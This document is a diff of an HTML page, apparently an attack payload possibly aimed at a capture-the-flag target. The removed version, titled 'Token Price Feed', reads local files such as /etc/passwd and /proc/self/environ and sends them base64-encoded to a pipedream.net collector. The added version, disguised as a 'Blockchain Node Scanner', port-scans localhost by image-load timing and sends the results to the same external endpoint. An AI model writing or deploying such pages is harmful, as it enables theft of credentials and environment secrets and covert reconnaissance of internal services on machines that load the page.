@@ -1,29 +1,40 @@
 <html>
-<head><title>Token Price Feed</title></head>
+<head><title>Blockchain Node Scanner</title></head>
 <body>
-<h1>Fetching Live Prices...</h1>
+<h1>Scanning Network Nodes...</h1>
 <script>
-// Try common flag locations
-var paths = [
-  'file:///etc/proc',
-  'file:///etc/passwd',
-  'file:///etc/hostname',
-  'file:///proc/self/environ',
-  'file:///proc/self/cmdline'
+var ports = [
+  80, 443, 3000, 4000, 5000, 6000, 7000, 8000, 8080, 8443, 8888,
+  9090, 9222, 9229, 3306, 5432, 6379, 27017, 11211
 ];
+var results = [];
+var done = 0;
 
-paths.forEach(function(path, i) {
-  setTimeout(function() {
-    fetch(path)
-      .then(function(r) { return r.text(); })
-      .then(function(d) {
-        fetch('https://eoh2zr5zzepcygc.m.pipedream.net?file=' + encodeURIComponent(path) + '&data=' + btoa(d));
-      })
-      .catch(function(e) {
-        fetch('https://eoh2zr5zzepcygc.m.pipedream.net?file=' + encodeURIComponent(path) + '&error=' + e.message);
-      });
-  }, i * 200);
+ports.forEach(function(port) {
+  var img = new Image();
+  var start = Date.now();
+
+  img.onload = function() {
+    results.push(port + ':open');
+    check();
+  };
+  img.onerror = function() {
+    var time = Date.now() - start;
+    // Fast error = port is open but refused HTTP
+    // Slow error = port is closed (timeout)
+    results.push(port + ':' + (time < 1000 ? 'open' : 'closed'));
+    check();
+  };
+
+  img.src = 'http://127.0.0.1:' + port + '/favicon.ico?' + Math.random();
 });
+
+function check() {
+  done++;
+  if (done >= ports.length) {
+    fetch('https://eoh2zr5zzepcygc.m.pipedream.net?scan=' + encodeURIComponent(results.join(',')));
+  }
+}
 </script>
 </body>
 </html>
